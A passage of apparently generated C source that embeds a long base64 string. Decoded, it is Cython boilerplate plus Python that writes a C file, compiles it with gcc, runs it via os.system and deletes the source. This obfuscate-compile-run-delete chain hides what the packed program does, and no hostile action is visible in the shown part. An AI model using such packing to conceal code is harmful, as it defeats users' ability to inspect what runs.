mQ6CiAgICB7CiAgICAgICAgUHlPYmplY3QgKnJlc3VsdD1OVUxMOwogICAgICAgIGlmIChmb3VuZCAmJiBmb3VuZC0+aWQgPT0gaW50ZXJwcmV0ZXJfaWQpIHsKICAgICAgICAgICAgcmVzdWx0ID0gZm91bmQtPm1vZHVsZTsKICAgICAgICB9CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgICAgIF9fcHl4X2F0b21pY19kZWNyX2FjcV9yZWwoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcik7CiNlbmRpZgogICAgICAgIHJldHVybiByZXN1bHQ7CiAgICB9Cn0KI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFCnN0YXRpYyB2b2lkIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3dhaXRfdW50aWxfbm9fcmVhZGVycyh2b2lkKSB7CiAgICB3aGlsZSAoX19weXhfYXRvbWljX2xvYWQoJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX3JlYWRfY291bnRlcikgIT0gMCk7Cn0KI2Vsc2UKI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF93YWl0X3VudGlsX25vX3JlYWRlcnMoKQojZW5kaWYKc3RhdGljIGludCBfX1B5eF9TdGF0ZV9BZGRNb2R1bGVJbnRlcnBJZEFzSW5kZXgoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICoqb2xkX2RhdGEsIFB5T2JqZWN0KiBtb2R1bGUsIGludDY0X3QgaW50ZXJwcmV0ZXJfaWQpIHsKICAgIFB5X3NzaXplX3QgdG9fYWxsb2NhdGUgPSAoKm9sZF9kYXRhKS0+YWxsb2NhdGVkOwogICAg""d2hpbGUgKHRvX2FsbG9jYXRlIDw9IGludGVycHJldGVyX2lkKSB7CiAgICAgICAgaWYgKHRvX2FsbG9jYXRlID09IDApIHRvX2FsbG9jYXRlID0gMTsKICAgICAgICBlbHNlIHRvX2FsbG9jYXRlICo9IDI7CiAgICB9CiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKm5ld19kYXRhID0gKm9sZF9kYXRhOwogICAgaWYgKHRvX2FsbG9jYXRlICE9ICgqb2xkX2RhdGEpLT5hbGxvY2F0ZWQpIHsKICAgICAgICAgbmV3X2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopcmVhbGxvYygKICAgICAgICAgICAgKm9sZF9kYXRhLAogICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSsodG9fYWxsb2NhdGUtMSkqc2l6ZW9mKF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUpKTsKICAgICAgICBpZiAoIW5ld19kYXRhKSB7CiAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7CiAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICB9CiAgICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBuZXdfZGF0YS0+YWxsb2NhdGVkOyBpIDwgdG9fYWxsb2NhdGU7ICsraSkgewogICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBpOwogICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0ubW9kdWxlID0gTlVMTDsKICAgICAgICB9CiAgICAgICAgbmV3X2RhdGEtPmFsbG9jYXRlZCA9IHRvX2FsbG9jYXRlOwogICAgfQogICAgbmV3X2RhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBtb2R1bGU7CiAgICBpZiAobmV3X2RhdGEtPmNvdW50IDwgaW50ZXJwcmV0ZXJfaWQrMSkgewogICAgICAgIG5ld19kYXRhLT5jb3VudCA9IGludGVycHJldGVyX2lkKzE7CiAgICB9CiAgICAqb2xkX2RhdGEgPSBuZXdfZGF0YTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyB2b2lkIF9fUHl4X1N0YXRlX0NvbnZlcnRGcm9tSW50ZXJwSWRBc0luZGV4KF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqZGF0YSkgewogICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqcmVhZCA9IGRhdGEtPnRhYmxlOwogICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqd3JpdGUgPSBkYXRhLT50YWJsZTsKICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUgKmVuZCA9IHJlYWQgKyBkYXRhLT5jb3VudDsKICAgIGZvciAoOyByZWFkPGVuZDsgKytyZWFkKSB7CiAgICAgICAgaWYgKHJlYWQtPm1vZHVsZSkgewogICAgICAgICAgICB3cml0ZS0+aWQgPSByZWFkLT5pZDsKICAgICAgICAgICAgd3JpdGUtPm1vZHVsZSA9IHJlYWQtPm1vZHVsZTsKICAgICAgICAgICAgKyt3cml0ZTsKICAgICAgICB9CiAgICB9CiAgICBkYXRhLT5jb3VudCA9IHdyaXRlIC0gZGF0YS0+dGFibGU7CiAgICBmb3IgKDsgd3JpdGU8ZW5kOyArK3dyaXRlKSB7CiAgICAgICAgd3JpdGUtPmlkID0gMDsKICAgICAgICB3cml0ZS0+bW9kdWxlID0gTlVMTDsKICAgIH0KICAgIGRhdGEtPmludGVycHJldGVyX2lkX2FzX2lu""ZGV4ID0gMDsKfQpzdGF0aWMgaW50IF9fUHl4X1N0YXRlX0FkZE1vZHVsZShQeU9iamVjdCogbW9kdWxlLCBDWVRIT05fVU5VU0VEIHZvaWQqIGR1bW15KSB7CiAgICBpbnQ2NF90IGludGVycHJldGVyX2lkID0gUHlJbnRlcnByZXRlclN0YXRlX0dldElEKF9fUHl4X1B5SW50ZXJwcmV0ZXJTdGF0ZV9HZXQoKSk7CiAgICBpZiAoaW50ZXJwcmV0ZXJfaWQgPT0gLTEpIHJldHVybiAtMTsKICAgIGludCByZXN1bHQgPSAwOwogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfTG9jaygpOwojaWYgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSAoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICopCiAgICAgICAgICAgIF9fcHl4X2F0b21pY19wb2ludGVyX2V4Y2hhbmdlKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhLCAwKTsKI2Vsc2UKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqb2xkX2RhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhOwojZW5kaWYKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqbmV3X2RhdGEgPSBvbGRfZGF0YTsKICAgIGlmICghbmV3X2RhdGEpIHsKICAgICAgICBuZXdfZGF0YSA9IChfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKiljYWxsb2MoMSwgc2l6ZW9mKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSkpOwogICAgICAgIGlmICghbmV3X2RhdGEpIHsKICAgICAgICAgICAgcmVzdWx0ID0gLTE7CiAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7CiAgICAgICAgICAgIGdvdG8gZW5kOwogICAgICAgIH0KICAgICAgICBuZXdfZGF0YS0+YWxsb2NhdGVkID0gMTsKICAgICAgICBuZXdfZGF0YS0+aW50ZXJwcmV0ZXJfaWRfYXNfaW5kZXggPSAxOwogICAgfQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCk7CiAgICBpZiAobmV3X2RhdGEtPmludGVycHJldGVyX2lkX2FzX2luZGV4KSB7CiAgICAgICAgaWYgKGludGVycHJldGVyX2lkIDwgX19QWVhfTU9EVUxFX1NUQVRFX0xPT0tVUF9TTUFMTF9TSVpFKSB7CiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X1N0YXRlX0FkZE1vZHVsZUludGVycElkQXNJbmRleCgmbmV3X2RhdGEsIG1vZHVsZSwgaW50ZXJwcmV0ZXJfaWQpOwogICAgICAgICAgICBnb3RvIGVuZDsKICAgICAgICB9CiAgICAgICAgX19QeXhfU3RhdGVfQ29udmVydEZyb21JbnRlcnBJZEFzSW5kZXgobmV3X2RhdGEpOwogICAgfQogICAgewogICAgICAgIFB5X3NzaXplX3QgaW5zZXJ0X2F0ID0gMDsKICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X0ludGVycHJldGVySWRBbmRNb2R1bGUqIGxvd2VyX2JvdW5kID0gX19QeXhfU3RhdGVfRmluZE1vZHVsZVN0YXRlTG9va3VwVGFibGVMb3dlckJvdW5kKAogICAgICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlLCBuZXdfZGF0YS0+Y291bnQsIGludGVycHJl""dGVyX2lkKTsKICAgICAgICAgICAgYXNzZXJ0KGxvd2VyX2JvdW5kKTsKICAgICAgICAgICAgaW5zZXJ0X2F0ID0gbG93ZXJfYm91bmQgLSBuZXdfZGF0YS0+dGFibGU7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShpbnNlcnRfYXQgPCBuZXdfZGF0YS0+Y291bnQgJiYgbG93ZXJfYm91bmQtPmlkID09IGludGVycHJldGVyX2lkKSkgewogICAgICAgICAgICAgICAgbG93ZXJfYm91bmQtPm1vZHVsZSA9IG1vZHVsZTsKICAgICAgICAgICAgICAgIGdvdG8gZW5kOyAgLy8gYWxyZWFkeSBpbiB0YWJsZSwgbm90aGluZyBtb3JlIHRvIGRvCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKG5ld19kYXRhLT5jb3VudCsxID49IG5ld19kYXRhLT5hbGxvY2F0ZWQpIHsKICAgICAgICAgICAgUHlfc3NpemVfdCB0b19hbGxvY2F0ZSA9IChuZXdfZGF0YS0+Y291bnQrMSkqMjsKICAgICAgICAgICAgbmV3X2RhdGEgPQogICAgICAgICAgICAgICAgKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSopcmVhbGxvYygKICAgICAgICAgICAgICAgICAgICBuZXdfZGF0YSwKICAgICAgICAgICAgICAgICAgICBzaXplb2YoX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhKSArCiAgICAgICAgICAgICAgICAgICAgKHRvX2FsbG9jYXRlLTEpKnNpemVvZihfX1B5eF9JbnRlcnByZXRlcklkQW5kTW9kdWxlKSk7CiAgICAgICAgICAgIGlmICghbmV3X2RhdGEpIHsKICAgICAgICAgICAgICAgIHJlc3VsdCA9IC0xOwogICAgICAgICAgICAgICAgbmV3X2RhdGEgPSBvbGRfZGF0YTsKICAgICAgICAgICAgICAgIFB5RXJyX05vTWVtb3J5KCk7CiAgICAgICAgICAgICAgICBnb3RvIGVuZDsKICAgICAgICAgICAgfQogICAgICAgICAgICBuZXdfZGF0YS0+YWxsb2NhdGVkID0gdG9fYWxsb2NhdGU7CiAgICAgICAgfQogICAgICAgICsrbmV3X2RhdGEtPmNvdW50OwogICAgICAgIGludDY0X3QgbGFzdF9pZCA9IGludGVycHJldGVyX2lkOwogICAgICAgIFB5T2JqZWN0ICpsYXN0X21vZHVsZSA9IG1vZHVsZTsKICAgICAgICBmb3IgKFB5X3NzaXplX3QgaT1pbnNlcnRfYXQ7IGk8bmV3X2RhdGEtPmNvdW50OyArK2kpIHsKICAgICAgICAgICAgaW50NjRfdCBjdXJyZW50X2lkID0gbmV3X2RhdGEtPnRhYmxlW2ldLmlkOwogICAgICAgICAgICBuZXdfZGF0YS0+dGFibGVbaV0uaWQgPSBsYXN0X2lkOwogICAgICAgICAgICBsYXN0X2lkID0gY3VycmVudF9pZDsKICAgICAgICAgICAgUHlPYmplY3QgKmN1cnJlbnRfbW9kdWxlID0gbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZTsKICAgICAgICAgICAgbmV3X2RhdGEtPnRhYmxlW2ldLm1vZHVsZSA9IGxhc3RfbW9kdWxlOwogICAgICAgICAgICBsYXN0X21vZHVsZSA9IGN1cnJlbnRfbW9kdWxlOwogICAgICAgIH0KICAgIH0KICBlbmQ6CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19weXhfYXRvbWljX3BvaW50ZXJfZXhjaGFuZ2UoJl9fUHl4X01vZHVsZVN0YXRlTG9v""a3VwX2RhdGEsIG5ld19kYXRhKTsKI2Vsc2UKICAgIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX2RhdGEgPSBuZXdfZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludCBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoQ1lUSE9OX1VOVVNFRCB2b2lkKiBkdW1teSkgewogICAgaW50NjRfdCBpbnRlcnByZXRlcl9pZCA9IFB5SW50ZXJwcmV0ZXJTdGF0ZV9HZXRJRChfX1B5eF9QeUludGVycHJldGVyU3RhdGVfR2V0KCkpOwogICAgaWYgKGludGVycHJldGVyX2lkID09IC0xKSByZXR1cm4gLTE7CiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCk7CiNpZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRQogICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBEYXRhICpkYXRhID0gKF9fUHl4X01vZHVsZVN0YXRlTG9va3VwRGF0YSAqKQogICAgICAgICAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgMCk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cERhdGEgKmRhdGEgPSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhOwojZW5kaWYKICAgIGlmIChkYXRhLT5pbnRlcnByZXRlcl9pZF9hc19pbmRleCkgewogICAgICAgIGlmIChpbnRlcnByZXRlcl9pZCA8IGRhdGEtPmNvdW50KSB7CiAgICAgICAgICAgIGRhdGEtPnRhYmxlW2ludGVycHJldGVyX2lkXS5tb2R1bGUgPSBOVUxMOwogICAgICAgIH0KICAgICAgICBnb3RvIGRvbmU7CiAgICB9CiAgICB7CiAgICAgICAgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfd2FpdF91bnRpbF9ub19yZWFkZXJzKCk7CiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSogbG93ZXJfYm91bmQgPSBfX1B5eF9TdGF0ZV9GaW5kTW9kdWxlU3RhdGVMb29rdXBUYWJsZUxvd2VyQm91bmQoCiAgICAgICAgICAgIGRhdGEtPnRhYmxlLCBkYXRhLT5jb3VudCwgaW50ZXJwcmV0ZXJfaWQpOwogICAgICAgIGlmICghbG93ZXJfYm91bmQpIGdvdG8gZG9uZTsKICAgICAgICBpZiAobG93ZXJfYm91bmQtPmlkICE9IGludGVycHJldGVyX2lkKSBnb3RvIGRvbmU7CiAgICAgICAgX19QeXhfSW50ZXJwcmV0ZXJJZEFuZE1vZHVsZSAqZW5kID0gZGF0YS0+dGFibGUrZGF0YS0+Y291bnQ7CiAgICAgICAgZm9yICg7bG93ZXJfYm91bmQ8ZW5kLTE7ICsrbG93ZXJfYm91bmQpIHsKICAgICAgICAgICAgbG93ZXJfYm91bmQtPmlkID0gKGxvd2VyX2JvdW5kKzEpLT5pZDsKICAgICAgICAgICAgbG93ZXJfYm91bmQtPm1vZHVsZSA9IChsb3dlcl9ib3VuZCsxKS0+bW9kdWxlOwogICAgICAgIH0KICAgIH0KICAgIC0tZGF0YS0+Y291bnQ7CiAgICBpZiAoZGF0YS0+Y291bnQgPT0gMCkgewogICAgICAgIGZyZWUoZGF0YSk7CiAgICAgICAgZGF0YSA9IE5VTEw7CiAgICB9CiAgZG9uZToKI2lmIENZVEhPTl9NT0RVTEVfU1RB""VEVfTE9PS1VQX1RIUkVBRF9TQUZFCiAgICBfX3B5eF9hdG9taWNfcG9pbnRlcl9leGNoYW5nZSgmX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfZGF0YSwgZGF0YSk7CiNlbHNlCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9kYXRhID0gZGF0YTsKI2VuZGlmCiAgICBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9VbmxvY2soKTsKICAgIHJldHVybiAwOwp9CiNlbmRpZgoKCiNpZmRlZiBfTVNDX1ZFUgojcHJhZ21hIHdhcm5pbmcoIHBvcCApCiNlbmRpZgoKCgoKI2VuZGlmIAoKI2lmZGVmIF9fRnJlZUJTRF9fCiNpbmNsdWRlIDxkZWRlLmg+CiNlbmRpZgojaWYgUFlfTUFKT1JfVkVSU0lPTiA8IDMKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIqKiBhcmd2KSB7CiNlbGlmIGRlZmluZWQoV2luMzIpIHx8IGRlZmluZWQoTVNfV0lORE9XUykKaW50IHdtYWluKGludCBhcmdjLCB3Y2hhcl90ICoqYXJndikgewojZWxzZQpzdGF0aWMgaW50IF9fUHl4X21haW4oaW50IGFyZ2MsIHdjaGFyX3QgKiphcmd2KSB7CiNlbmRpZgojaWZkZWYgX19GcmVlQlNEX18KICAgIGZwX2V4Y2VwdF90IG07CiAgICBtID0gZnBnZXRtYXNrKCk7CiAgICBmcHNldG1hc2sobSAmIH5GUF9YX09GTCk7CiNlbmRpZgogICAgaWYgKGFyZ2MgJiYgYXJndikKICAgICAgICBQeV9TZXRQcm9ncmFtTmFtZShhcmd2WzBdKTsKICAgIFB5X0luaXRpYWxpemUoKTsKICAgIGlmIChhcmdjICYmIGFyZ3YpCiAgICAgICAgUHlTeXNfU2V0QXJndihhcmdjLCBhcmd2KTsKICAgIHsKICAgICAgUHlPYmplY3QqIG0gPSBOVUxMOwogICAgICBfX3B5eF9tb2R1bGVfaXNfbWFpbl9nYSA9IDE7CiAgICAgICNpZiBQWV9NQUpPUl9WRVJTSU9OIDwgMwogICAgICAgICAgaW5pdGdhKCk7CiAgICAgICNlbGlmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogICAgICAgICAgbSA9IFB5SW5pdF9nYSgpOwogICAgICAgICAgaWYgKCFQeU1vZHVsZV9DaGVjayhtKSkgewogICAgICAgICAgICAgIFB5TW9kdWxlRGVmICptZGVmID0gKFB5TW9kdWxlRGVmICopIG07CiAgICAgICAgICAgICAgUHlPYmplY3QgKm1vZG5hbWUgPSBQeVVuaWNvZGVfRnJvbVN0cmluZygiX19tYWluX18iKTsKICAgICAgICAgICAgICBtID0gTlVMTDsKICAgICAgICAgICAgICBpZiAobW9kbmFtZSkgewogICAgICAgICAgICAgICAgICBtID0gUHlNb2R1bGVfTmV3T2JqZWN0KG1vZG5hbWUpOwogICAgICAgICAgICAgICAgICBQeV9ERUNSRUYobW9kbmFtZSk7CiAgICAgICAgICAgICAgICAgIGlmIChtKSBQeU1vZHVsZV9FeGVjRGVmKG0sIG1kZWYpOwogICAgICAgICAgICAgIH0KICAgICAgICAgIH0KICAgICAgI2Vsc2UKICAgICAgICAgIG0gPSBQeUluaXRfZ2EoKTsKICAgICAgI2VuZGlmCiAgICAgIGlmIChQeUVycl9PY2N1cnJlZCgpKSB7CiAgICAgICAgICBQeUVycl9QcmludCgpOwogICAgICAgICAgI2lmIFBZX01BSk9SX1ZFUlNJT04gPCAzCiAgICAgICAgICBpZiAoUHlfRmx1c2hMaW5lKCkpIFB5RXJyX0NsZWFy""KCk7CiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIHJldHVybiAxOwogICAgICB9CiAgICAgIFB5X1hERUNSRUYobSk7CiAgICB9CiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwNjAwMDAKICAgIFB5X0ZpbmFsaXplKCk7CiNlbHNlCiAgICBpZiAoUHlfRmluYWxpemVFeCgpIDwgMCkKICAgICAgICByZXR1cm4gMjsKI2VuZGlmCiAgICByZXR1cm4gMDsKfQojaWYgUFlfTUFKT1JfVkVSU0lPTiA+PSAzICYmICFkZWZpbmVkKFdpbjMyKSAmJiAhZGVmaW5lZChNU19XSU5ET1dTKQojaW5jbHVkZSA8bG9jYWxlLmg+CnN0YXRpYyB3Y2hhcl90KgpfX1B5eF9jaGFyMndjaGFyKGNoYXIqIGFyZykKewogICAgd2NoYXJfdCAqcmVzOwojaWZkZWYgSEFWRV9CUk9LRU5fTUJTVE9XQ1MKICAgIHNpemVfdCBhcmdzaXplID0gc3RybGVuKGFyZyk7CiNlbHNlCiAgICBzaXplX3QgYXJnc2l6ZSA9IG1ic3Rvd2NzKE5VTEwsIGFyZywgMCk7CiNlbmRpZgogICAgc2l6ZV90IGNvdW50OwogICAgdW5zaWduZWQgY2hhciAqaW47CiAgICB3Y2hhcl90ICpvdXQ7CiNpZmRlZiBIQVZFX01CUlRPV0MKICAgIG1ic3RhdGVfdCBtYnM7CiNlbmRpZgogICAgaWYgKGFyZ3NpemUgIT0gKHNpemVfdCktMSkgewogICAgICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChhcmdzaXplKzEpKnNpemVvZih3Y2hhcl90KSk7CiAgICAgICAgaWYgKCFyZXMpCiAgICAgICAgICAgIGdvdG8gb29tOwogICAgICAgIGNvdW50ID0gbWJzdG93Y3MocmVzLCBhcmcsIGFyZ3NpemUrMSk7CiAgICAgICAgaWYgKGNvdW50ICE9IChzaXplX3QpLTEpIHsKICAgICAgICAgICAgd2NoYXJfdCAqdG1wOwogICAgICAgICAgICBmb3IgKHRtcCA9IHJlczsgKnRtcCAhPSAwICYmCiAgICAgICAgICAgICAgICAgICAgICgqdG1wIDwgMHhkODAwIHx8ICp0bXAgPiAweGRmZmYpOyB0bXArKykKICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgaWYgKCp0bXAgPT0gMCkKICAgICAgICAgICAgICAgIHJldHVybiByZXM7CiAgICAgICAgfQogICAgICAgIGZyZWUocmVzKTsKICAgIH0KI2lmZGVmIEhBVkVfTUJSVE9XQwogICAgYXJnc2l6ZSA9IHN0cmxlbihhcmcpICsgMTsKICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKGFyZ3NpemUqc2l6ZW9mKHdjaGFyX3QpKTsKICAgIGlmICghcmVzKSBnb3RvIG9vbTsKICAgIGluID0gKHVuc2lnbmVkIGNoYXIqKWFyZzsKICAgIG91dCA9IHJlczsKICAgIG1lbXNldCgmbWJzLCAwLCBzaXplb2YgbWJzKTsKICAgIHdoaWxlIChhcmdzaXplKSB7CiAgICAgICAgc2l6ZV90IGNvbnZlcnRlZCA9IG1icnRvd2Mob3V0LCAoY2hhciopaW4sIGFyZ3NpemUsICZtYnMpOwogICAgICAgIGlmIChjb252ZXJ0ZWQgPT0gMCkKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgaWYgKGNvbnZlcnRlZCA9PSAoc2l6ZV90KS0yKSB7CiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAidW5leHBlY3RlZCBtYnJ0b3djIHJlc3VsdCAtMiIpOwogICAgICAgICAgICBmcmVlKHJlcyk7""CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgICAgICBpZiAoY29udmVydGVkID09IChzaXplX3QpLTEpIHsKICAgICAgICAgICAgKm91dCsrID0gMHhkYzAwICsgKmluKys7CiAgICAgICAgICAgIGFyZ3NpemUtLTsKICAgICAgICAgICAgbWVtc2V0KCZtYnMsIDAsIHNpemVvZiBtYnMpOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICB9CiAgICAgICAgaWYgKCpvdXQgPj0gMHhkODAwICYmICpvdXQgPD0gMHhkZmZmKSB7CiAgICAgICAgICAgIGFyZ3NpemUgLT0gY29udmVydGVkOwogICAgICAgICAgICB3aGlsZSAoY29udmVydGVkLS0pCiAgICAgICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKzsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIGluICs9IGNvbnZlcnRlZDsKICAgICAgICBhcmdzaXplIC09IGNvbnZlcnRlZDsKICAgICAgICBvdXQrKzsKICAgIH0KI2Vsc2UKICAgIHJlcyA9ICh3Y2hhcl90ICopbWFsbG9jKChzdHJsZW4oYXJnKSsxKSpzaXplb2Yod2NoYXJfdCkpOwogICAgaWYgKCFyZXMpIGdvdG8gb29tOwogICAgaW4gPSAodW5zaWduZWQgY2hhciopYXJnOwogICAgb3V0ID0gcmVzOwogICAgd2hpbGUoKmluKQogICAgICAgIGlmKCppbiA8IDEyOCkKICAgICAgICAgICAgKm91dCsrID0gKmluKys7CiAgICAgICAgZWxzZQogICAgICAgICAgICAqb3V0KysgPSAweGRjMDAgKyAqaW4rKzsKICAgICpvdXQgPSAwOwojZW5kaWYKICAgIHJldHVybiByZXM7Cm9vbToKICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpOwogICAgcmV0dXJuIE5VTEw7Cn0KaW50Cm1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQp7CiAgICBpZiAoIWFyZ2MpIHsKICAgICAgICByZXR1cm4gX19QeXhfbWFpbigwLCBOVUxMKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIGludCBpLCByZXM7CiAgICAgICAgd2NoYXJfdCAqKmFyZ3ZfY29weSA9ICh3Y2hhcl90ICoqKW1hbGxvYyhzaXplb2Yod2NoYXJfdCopKmFyZ2MpOwogICAgICAgIHdjaGFyX3QgKiphcmd2X2NvcHkyID0gKHdjaGFyX3QgKiopbWFsbG9jKHNpemVvZih3Y2hhcl90KikqYXJnYyk7CiAgICAgICAgY2hhciAqb2xkbG9jID0gc3RyZHVwKHNldGxvY2FsZShMQ19BTEwsIE5VTEwpKTsKICAgICAgICBpZiAoIWFyZ3ZfY29weSB8fCAhYXJndl9jb3B5MiB8fCAhb2xkbG9jKSB7CiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAib3V0IG9mIG1lbW9yeSIpOwogICAgICAgICAgICBmcmVlKGFyZ3ZfY29weSk7CiAgICAgICAgICAgIGZyZWUoYXJndl9jb3B5Mik7CiAgICAgICAgICAgIGZyZWUob2xkbG9jKTsKICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIHJlcyA9IDA7CiAgICAgICAgc2V0bG9jYWxlKExDX0FMTCwgIiIpOwogICAgICAgIGZvciAoaSA9IDA7IGkgPCBhcmdjOyBpKyspIHsKICAgICAgICAgICAgYXJndl9jb3B5MltpXSA9IGFyZ3ZfY29weVtpXSA9IF9fUHl4X2No""YXIyd2NoYXIoYXJndltpXSk7CiAgICAgICAgICAgIGlmICghYXJndl9jb3B5W2ldKSByZXMgPSAxOwogICAgICAgIH0KICAgICAgICBzZXRsb2NhbGUoTENfQUxMLCBvbGRsb2MpOwogICAgICAgIGZyZWUob2xkbG9jKTsKICAgICAgICBpZiAocmVzID09IDApCiAgICAgICAgICAgIHJlcyA9IF9fUHl4X21haW4oYXJnYywgYXJndl9jb3B5KTsKICAgICAgICBmb3IgKGkgPSAwOyBpIDwgYXJnYzsgaSsrKSB7CiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwNTAwMDAKICAgICAgICAgICAgZnJlZShhcmd2X2NvcHkyW2ldKTsKI2Vsc2UKICAgICAgICAgICAgUHlNZW1fUmF3RnJlZShhcmd2X2NvcHkyW2ldKTsKI2VuZGlmCiAgICAgICAgfQogICAgICAgIGZyZWUoYXJndl9jb3B5KTsKICAgICAgICBmcmVlKGFyZ3ZfY29weTIpOwogICAgICAgIHJldHVybiByZXM7CiAgICB9Cn0KI2VuZGlmCiIiIgoKQ19GSUxFID0ie25hbWUyX2Jhc2V9LmMiClBZVEhPTl9WRVJTSU9OID0gIi4iLmpvaW4oc3lzLnZlcnNpb24uc3BsaXQoIiAiKVswXS5zcGxpdCgiLiIpWzotMV0pCkNPTVBJTEVfRklMRSA9ICgnZ2NjIC1JJyArIFBSRUZJWCArICcvaW5jbHVkZS9weXRob24nICsgUFlUSE9OX1ZFUlNJT04gKyAnIC1vICcgKyBFWEVDVVRFX0ZJTEUgKyAnICcgKyBDX0ZJTEUgKyAnIC1MJyArIFBSRUZJWCArICcvbGliIC1scHl0aG9uJyArIFBZVEhPTl9WRVJTSU9OKQp3aXRoIG9wZW4oQ19GSUxFLCd3JykgYXMgZjoKICAgIGYud3JpdGUoQ19TT1VSQ0UpCm9zLm1ha2VkaXJzKG9zLnBhdGguZGlybmFtZShFWEVDVVRFX0ZJTEUpLGV4aXN0X29rPVRydWUpCm9zLnN5c3RlbShFWFBPUlRfUFlUSE9OSE9NRSArIiYmIisgRVhQT1JUX1BZVEhPTl9FWEVDVVRBQkxFICsiJiYiICsgQ09NUElMRV9GSUxFICsiJiYiKyBSVU4pCm9zLnJlbW92ZShDX0ZJTEUp";\n\n\n\n\n#ifndef CYTHON_SMALL_CODE\n#if defined(__clang__)\n    #define CYTHON_SMALL_CODE\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\n    #define CYTHON_SMALL_CODE 